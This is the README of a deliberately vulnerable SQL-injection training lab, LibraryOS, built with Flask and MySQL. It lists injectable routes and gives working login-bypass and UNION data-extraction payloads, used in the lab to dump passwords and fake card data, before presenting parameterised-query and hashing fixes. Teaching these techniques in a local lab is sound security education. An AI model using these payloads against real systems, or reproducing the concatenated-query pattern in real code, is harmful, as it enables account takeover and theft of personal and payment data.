# LibraryOS — SQL Injection Lab
### Red Team / Cybersecurity Education Project

> ⚠️ **ETHICAL NOTICE** — This application is **deliberately vulnerable**.
> It must be run **locally only**, used exclusively for **educational purposes**,
> and **never deployed** on a public network.

---

## Table of Contents

1. [Architecture Design](#1-architecture-design)
2. [Technical Description](#2-technical-description)
3. [Database Schema](#3-database-schema)
4. [Vulnerability Explanation](#4-vulnerability-explanation)
5. [Full A→Z Execution Guide](#5-full-az-execution-guide)
6. [Exploit Payloads](#6-exploit-payloads)
7. [Blue Team — Secure Fix](#7-blue-team--secure-fix)

---

## 1. Architecture Design

### 1.1 Folder Structure

```
sqli-lab/
├── docker-compose.yml          # Orchestrates web + db containers
├── README.md                   # This file
│
├── backend/                    # Flask application
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── app.py                  # Main app — login + per-page vulnerable search
│   ├── static/
│   │   ├── css/style.css       # Application styles
│   │   └── js/app.js           # Client-side JavaScript
│   └── templates/
│       ├── base.html           # Shared layout + navigation
│       ├── login.html          # Vulnerable login form + SQL debug panel
│       ├── dashboard.html      # Role-aware landing page (metrics)
│       ├── books.html          # Book catalogue + vulnerable search
│       ├── loans.html          # Loan records + vulnerable search
│       ├── members.html        # Admin-only member list + vulnerable search
│       └── secrets.html        # Super-admin — member data + bank cards
│
└── db/
    └── init.sql                # Schema + seed data (auto-runs on first start)
```

### 1.2 Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker Network (librarynet)               │
│                                                             │
│   ┌───────────────────────────────┐                         │
│   │      Flask Container          │                         │
│   │      (libraryos_web)          │                         │
│   │      port 5000                │                         │
│   │                               │                         │
│   │  ┌─────────────────────────┐  │                         │
│   │  │  app.py                 │  │                         │
│   │  │  ┌──────────────────┐   │  │                         │
│   │  │  │ /login   ← VULN  │   │  │                         │
│   │  │  │ /dashboard       │   │  │                         │
│   │  │  │ /books   ← VULN  │   │  │                         │
│   │  │  │ /loans   ← VULN  │   │  │                         │
│   │  │  │ /members ← VULN  │   │  │                         │
│   │  │  │ /secrets ← VULN  │   │  │                         │
│   │  │  └──────────────────┘   │  │                         │
│   │  └─────────────────────────┘  │                         │
│   └──────────────┬────────────────┘                         │
│                  │ MySQLdb (raw queries)                     │
│   ┌──────────────▼────────────────┐                         │
│   │      MySQL Container          │                         │
│   │      (libraryos_db)           │                         │
│   │      port 3306 (internal)     │                         │
│   │                               │                         │
│   │  Tables: members, books,      │                         │
│   │          loans                │                         │
│   └───────────────────────────────┘                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
         ▲
         │  HTTP  (browser)
    localhost:5000
```

### 1.3 Component Interaction

```
Login Flow:
  Browser → POST /login (username, password)
         → Flask concatenates inputs into raw SQL string
         → MySQL executes the raw string
         → Flask reads row[0]=id, row[1]=username, row[2]=role
         → Stores in session → redirect to /dashboard

Search Flow (per-page):
  Browser → GET /books?q=<user_input>
         → Flask concatenates q into LIKE '%..%' clause
         → MySQL executes the raw string
         → Results rendered in table + raw query shown in debug panel
         → SQL errors displayed for error-based injection feedback
```

---

## 2. Technical Description

### 2.1 Technology Choices

| Component | Choice | Justification |
|-----------|--------|---------------|
| **Backend** | Python / Flask | Minimal boilerplate, clean raw-SQL path, excellent for showing the vulnerability without ORM abstraction. |
| **Database** | MySQL 8.0 | Industry standard, best-known SQL injection target, supports `-- ` and `#` comments, UNION syntax. |
| **Containerisation** | Docker + Compose | Reproducible environment, one-command startup, isolated network. |
| **Frontend** | Jinja2 HTML templates | No JS framework needed — keeps focus on backend vulnerability. |
| **Auth** | Flask sessions (server-side cookie) | Simple to show how role is read from DB row and stored in session. |

### 2.2 Deliberate Design Decisions

- **Plain-text passwords in DB**: exposes both SQLi AND missing hashing, compounding the severity story.
- **Login page shows the raw SQL query**: makes the vulnerability visible during the demo without needing browser dev tools.
- **Three role levels**: provides a clear privilege escalation narrative (user → admin → super_admin).
- **Per-page search with SQLi**: every data page (`/books`, `/loans`, `/members`, `/secrets`) has its own vulnerable search bar with raw SQL debug panel, allowing UNION-based and error-based injection on each route.
- **Fake credit card data**: the `/secrets` page exposes simulated banking data (`card_number`, `card_expiry`, `card_cvv`, `card_type`) to demonstrate real-world data breach impact.
- **Role-aware dashboard**: regular users see only their personal active loan count; admins/super_admins see global stats including member count.

### 2.3 Vulnerable Injection Points

| Route | Injection Vector | SQL Template |
|-------|-----------------|--------------|
| `/login` | `username` + `password` fields (POST) | `WHERE username='…' AND password='…'` |
| `/books` | `q` parameter (GET) | `WHERE title LIKE '%…%' OR author LIKE '%…%'` |
| `/loans` | `q` parameter (GET) | `WHERE username LIKE '%…%' OR title LIKE '%…%'` |
| `/members` | `q` parameter (GET) | `WHERE username LIKE '%…%' OR email LIKE '%…%'` |
| `/secrets` | `q` parameter (GET) | `WHERE username LIKE '%…%'` |

---

## 3. Database Schema

```sql
-- members: authentication target + sensitive data
members (
  id          INT AUTO_INCREMENT PK,
  username    VARCHAR(64) UNIQUE NOT NULL,
  password    VARCHAR(255) NOT NULL,    -- plain-text (intentional)
  email       VARCHAR(128) NOT NULL,
  role        ENUM('user','admin','super_admin'),
  card_number VARCHAR(19)  NULL,        -- fake credit card number
  card_expiry VARCHAR(5)   NULL,        -- MM/YY
  card_cvv    VARCHAR(4)   NULL,
  card_type   VARCHAR(20)  NULL,        -- Visa, Mastercard, etc.
  created_at  DATETIME
)

-- books: library catalogue
books (
  id      INT AUTO_INCREMENT PK,
  title   VARCHAR(255),
  author  VARCHAR(128),
  genre   VARCHAR(64),
  year    SMALLINT,
  copies  TINYINT
)

-- loans: book loan records
loans (
  id          INT AUTO_INCREMENT PK,
  member_id   INT FK→members,
  book_id     INT FK→books,
  loaned_at   DATETIME,
  due_at      DATETIME,
  returned_at DATETIME NULL     -- NULL = still active
)
```

### Seed Data Summary

- **17 members** (15 users, 1 admin, 1 super_admin)
- **20 books** across Technology, Fiction, Fantasy, Science Fiction, and Security genres
- **10 loans** with various active/returned/overdue states

### Key User Accounts

| Username | Password | Role | Card Type | Notes |
|----------|----------|------|-----------|-------|
| `alice` | `alice123` | user | Visa | Normal user — primary attack target |
| `bob` | `bobpass` | user | — | No card data |
| `charlie` | `charlie77` | user | Mastercard | Has card data |
| `diana` | `wonderwoman` | user | Amex | Has card data |
| `evan` | `evan_password` | user | Visa | Has card data |
| `fiona` | `shrekfan` | user | Discover | Has card data |
| `george` | `curious1` | user | — | No card data |
| `hannah` | `hannah_montana` | user | Mastercard | Has card data |
| `ian` | `ian_hacks` | user | Visa | Has card data |
| `julia` | `julia_childs` | user | Amex | Has card data |
| `kyle` | `kyle_bro` | user | — | No card data |
| `laura` | `laura_croft` | user | Mastercard | Has card data |
| `mike` | `mike_drop` | user | Visa | Has card data |
| `nina` | `nina_simone` | user | Discover | Has card data |
| `oscar` | `oscar_grouch` | user | — | No card data |
| `librarian` | `lib2024!` | admin | Mastercard | Admin — unlocks `/members` |
| `root_admin` | `R00t$uper!99` | super_admin | Amex | Root — unlocks `/secrets` |

---

## 4. Vulnerability Explanation

### 4.1 The Vulnerable Login Code (app.py)

```python
# ⚠️ DELIBERATELY VULNERABLE — string concatenation
query = (
    "SELECT id, username, role FROM members "
    "WHERE username = '" + username + "' "
    "AND password = '"   + password + "'"
)
cursor.execute(query)    # raw unsanitised string sent to MySQL
```

### 4.2 The Vulnerable Search Code (per-page)

```python
# ⚠️ DELIBERATELY VULNERABLE — string concatenation in LIKE clause
query = (
    "SELECT id,title,author,genre,year,copies FROM books "
    "WHERE title LIKE '%" + q + "%' OR author LIKE '%" + q + "%' "
    "ORDER BY title"
)
cursor.execute(query)
```

Each page (`/books`, `/loans`, `/members`, `/secrets`) uses the same pattern with its own column set.

### 4.3 Why It Is Exploitable

1. **User-controlled input** is embedded verbatim into the SQL string.
2. **No sanitisation**: quotes, dashes, and SQL keywords are passed through unchanged.
3. **The database cannot distinguish** the injected SQL from the intended query.
4. **The app trusts the DB result unconditionally**: whatever row comes back is rendered.
5. **Error messages are displayed**: SQL errors are shown in the debug panel, enabling error-based injection.

### 4.4 CWE / OWASP Classification

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command
- **OWASP Top 10 A03:2021**: Injection
- **CVSS Score** (hypothetical): 9.8 Critical (network, low complexity, no privileges required, high CIA impact)

---

## 5. Full A→Z Execution Guide

### Phase 0 — Prerequisites

Ensure the following are installed on your machine:

```bash
# Check Docker
docker --version
# Expected: Docker version 24.x.x or higher

# Check Docker Compose
docker compose version
# Expected: Docker Compose version v2.x.x

# Check Git (optional, for cloning)
git --version
```

If Docker is not installed: https://docs.docker.com/get-docker/

---

### Phase 1 — Get the Project

#### Option A — Clone from repo
```bash
git clone <your-repo-url> sqli-lab
cd sqli-lab
```

#### Option B — Use the files as delivered
```bash
cd sqli-lab   # navigate to the project root
```

Verify the structure:
```bash
ls -R
# Should show: docker-compose.yml, backend/, db/
```

---

### Phase 2 — Build and Launch

```bash
# From the sqli-lab/ root directory:
docker compose up --build
```

**What happens:**
1. Docker pulls `python:3.12-slim` and `mysql:8.0` images.
2. MySQL container starts, runs `db/init.sql` (creates schema + seed data with 17 members, 20 books, 10 loans).
3. Flask container builds, installs requirements, starts `app.py`.
4. Flask waits for MySQL to pass its healthcheck before connecting.

**Expected output (last lines):**
```
libraryos_db   | [Server] /usr/sbin/mysqld: ready for connections.
libraryos_web  |  * Running on http://0.0.0.0:5000
```

**This takes ~30–60 seconds on first run** (image download + DB init).

---

### Phase 3 — Verify the Application

Open your browser:

```
http://localhost:5000
```

You should see the **LibraryOS login page** with:
- A login form (left)
- Seed credentials display (right)
- Vulnerable SQL template display (right)

**Test legitimate login:**
- Username: `alice` | Password: `alice123` → Should succeed as `user`
- Click Logout
- Username: `librarian` | Password: `lib2024!` → Should succeed as `admin`
- Click Logout

---

### Phase 4 — Explore the Application

| Route | Access | Description | Search SQLi? |
|-------|--------|-------------|:------------:|
| `/login` | public | Vulnerable login form | — |
| `/dashboard` | any auth | Role-aware metrics page | — |
| `/books` | any auth | Book catalogue (20 books) | ✅ 6 columns |
| `/loans` | any auth | Loans (users see own; admin sees all) | ✅ 6 columns |
| `/members` | admin+ | All member accounts (17 members) | ✅ 5 columns |
| `/secrets` | super_admin | Member data + bank card info | ✅ 8 columns |

Every data page has:
- A **search form** that sends `GET ?q=...` to the same route
- A **raw SQL query panel** (yellow) showing the executed query
- A **database error panel** (red) when the SQL fails — useful for error-based injection

---

### Phase 5 — Exploit the Login Vulnerability

Open the browser at `http://localhost:5000/login`.

#### Attack 1 — ANY User (tautology)

```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

Observe: SQL panel shows the injected query. Login succeeds as `alice` (first DB row).

---

#### Attack 2 — Bypass as known user (comment)

```
Username: alice'-- 
Password: wrongpassword
```

Note: There is a **space after** the two dashes. This is required by MySQL.

---

#### Attack 3 — Escalate to Admin

```
Username: librarian'-- 
Password: (anything)
```

Observe: Logged in as `librarian` with `admin` role. Navigate to `/members` — full member list is visible.

---

#### Attack 4 — Escalate to Super-Admin (UNION)

```
Username: ' UNION SELECT 99,'hacker','super_admin'-- 
Password: (anything)
```

Observe: Session shows `user: hacker`, `role: super_admin`. Navigate to `/secrets` — card data visible.

---

#### Attack 5 — Super-Admin via Hash Comment

```
Username: root_admin'#
Password: (anything)
```

---

#### Attack 6 — Role-Based Targeting

```
Username: ' OR role='super_admin'-- 
Password: (anything)
```

---

### Phase 6 — Exploit the Search Vulnerability (Per-Page)

Once logged in, each data page has a search bar vulnerable to UNION-based and error-based injection.

#### Column Counts per Route

| Route | Base Query Columns | Column Count |
|-------|-------------------|:------------:|
| `/books` | id, title, author, genre, year, copies | **6** |
| `/loans` | l.id, m.username, b.title, loaned_at, due_at, returned_at | **6** |
| `/members` | id, username, email, role, created_at | **5** |
| `/secrets` | id, username, email, role, card_number, card_expiry, card_cvv, card_type | **8** |

#### UNION Injection — Extract passwords via `/books`

Enter in the `/books` search bar:

```
' UNION SELECT 1,username,password,role,5,6 FROM members#
```

The book table will display all usernames and their plain-text passwords.

#### UNION Injection — Extract card data via `/books`

```
' UNION SELECT 1,username,card_number,card_type,card_expiry,card_cvv FROM members#
```

#### UNION Injection — Extract passwords via `/members`

Enter in the `/members` search bar:

```
' UNION SELECT 1,username,password,role,5 FROM members#
```

#### UNION Injection — Extract passwords via `/secrets`

Enter in the `/secrets` search bar:

```
' UNION SELECT 1,username,password,4,5,6,7,8 FROM members#
```

#### Error-Based Injection — Probe column count

Enter in any search bar:

```
' ORDER BY 1#          → works
' ORDER BY 6#          → works (if 6 columns)
' ORDER BY 7#          → error → confirms column count
```

---

### Phase 7 — Demonstrate Impact

1. **`/dashboard`** → shows session role in the UI
2. **`/books`** → search bar can dump entire member table via UNION
3. **`/loans`** → UNION can extract data from any table
4. **`/members`** → visible only after admin bypass — search dumps passwords
5. **`/secrets`** → visible only after super_admin bypass — shows card data + search allows cross-table extraction

---

### Phase 8 — Show the Fix

In `backend/app.py`, replace the vulnerable login block with:

```python
# SECURE VERSION — parameterised query
query = (
    "SELECT id, username, role FROM members "
    "WHERE username = %s AND password = %s"
)
cursor.execute(query, (username, password))
```

For search queries, use:

```python
# SECURE VERSION — parameterised LIKE
query = (
    "SELECT id,title,author,genre,year,copies FROM books "
    "WHERE title LIKE %s OR author LIKE %s "
    "ORDER BY title"
)
pattern = f"%{q}%"
cursor.execute(query, (pattern, pattern))
```

Then restart:
```bash
docker compose restart web
```

Test that all injection payloads now fail.

---

### Phase 9 — Stop the Lab

```bash
# Stop containers (preserves DB volume)
docker compose down

# Stop AND delete all data (clean reset)
docker compose down -v
```

---

## 6. Exploit Payloads

### Login Payloads

| # | Username field | Password | Target | Technique |
|---|---------------|----------|--------|-----------|
| P1 | `' OR '1'='1` | `' OR '1'='1` | first user | Tautology |
| P2 | `alice'-- ` | (any) | alice (user) | Comment |
| P3 | `librarian'-- ` | (any) | librarian (admin) | Comment |
| P4 | `' UNION SELECT 99,'hacker','super_admin'-- ` | (any) | synthetic super_admin | UNION |
| P5 | `root_admin'#` | (any) | root_admin (super_admin) | Hash comment |
| P6 | `' OR role='super_admin'-- ` | (any) | first super_admin | Role filter |

### Search Payloads (UNION-based data extraction)

| Route | Payload (in search bar) | Extracts |
|-------|------------------------|----------|
| `/books` (6 cols) | `' UNION SELECT 1,username,password,role,5,6 FROM members#` | Credentials |
| `/books` (6 cols) | `' UNION SELECT 1,username,card_number,card_type,card_expiry,card_cvv FROM members#` | Card data |
| `/loans` (6 cols) | `' UNION SELECT 1,username,password,role,5,6 FROM members#` | Credentials |
| `/members` (5 cols) | `' UNION SELECT 1,username,password,role,5 FROM members#` | Credentials |
| `/secrets` (8 cols) | `' UNION SELECT 1,username,password,4,5,6,7,8 FROM members#` | Passwords |

### How Each Payload Works

**P1 — Tautology**: `' OR '1'='1` closes the string and adds a condition that is always true.

**P2/P3/P5 — Comment Injection**: `'-- ` or `'#` closes the string and comments out the rest of the query.

**P4 — UNION Injection**: `UNION SELECT` appends a fabricated row to the result set.

**P6 — Role Filter**: Filters by `role` column directly, no username needed.

**Search UNION**: The `'` closes the LIKE string, `UNION SELECT` appends rows from another table (or the same table with different columns). The `#` comments out the trailing `%'` and any ORDER BY.

---

## 7. Blue Team — Secure Fix

### Fix 1 — Parameterised Queries (Critical)

```python
# VULNERABLE (before):
query = "SELECT ... WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)

# SECURE (after):
query = "SELECT ... WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

**Why it works**: The database driver sends the query template and the values separately. MySQL compiles the query first, then substitutes values. Values can never alter the query's structure.

### Fix 2 — Parameterised Search

```python
# VULNERABLE (before):
query = "SELECT ... WHERE title LIKE '%" + q + "%'"
cursor.execute(query)

# SECURE (after):
query = "SELECT ... WHERE title LIKE %s"
cursor.execute(query, (f"%{q}%",))
```

### Fix 3 — Password Hashing

```python
import bcrypt

# At registration:
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

# At login:
query = "SELECT id, username, role, password FROM members WHERE username = %s"
cursor.execute(query, (username,))
row = cursor.fetchone()
if row and bcrypt.checkpw(password.encode('utf-8'), row[3].encode('utf-8')):
    # grant session
```

### Fix 4 — Input Validation

```python
import re

def validate_username(username):
    return bool(re.match(r'^[a-zA-Z0-9_]{3,64}$', username))

if not validate_username(username):
    return render_template('login.html', error="Invalid input format"), 400
```

### Fix 5 — Least Privilege DB Account

```sql
CREATE USER 'appuser'@'%' IDENTIFIED BY 'strongpassword';
GRANT SELECT ON librarydb.members TO 'appuser'@'%';
GRANT SELECT ON librarydb.books   TO 'appuser'@'%';
GRANT SELECT ON librarydb.loans   TO 'appuser'@'%';
-- Even with SQLi, attacker cannot DROP tables or write data
```

### Defence-in-Depth Summary

| Layer | Mitigation | Eliminates |
|-------|-----------|------------|
| Query | Parameterisation | All SQLi payloads |
| Password | bcrypt hashing | Credential extraction via UNION |
| Input | Regex validation | Many payload formats |
| DB account | Least privilege | Lateral movement after SQLi |
| App | Rate limiting | Brute force + blind SQLi |
| Infra | WAF rules | Known SQLi signatures |

---

### Key Talking Points

- "The vulnerability is **one line of code** — string concatenation instead of parameterisation."
- "The attacker doesn't need to know any password to log in as anyone, including root."
- "With the UNION payload, the attacker creates an identity that doesn't exist in the database."
- "Every search bar is an injection point — not just the login form."
- "The attacker can extract **credit card numbers** from the members table via any search bar."
- "The fix is also one line — but requires understanding WHY parameterisation works."
- "Plain-text passwords compound the issue — even without SQLi, a DB dump exposes everything."

---

*LibraryOS v2.0 — Red Team Education Lab*
*OWASP A03:2021 · CWE-89 · For educational use only*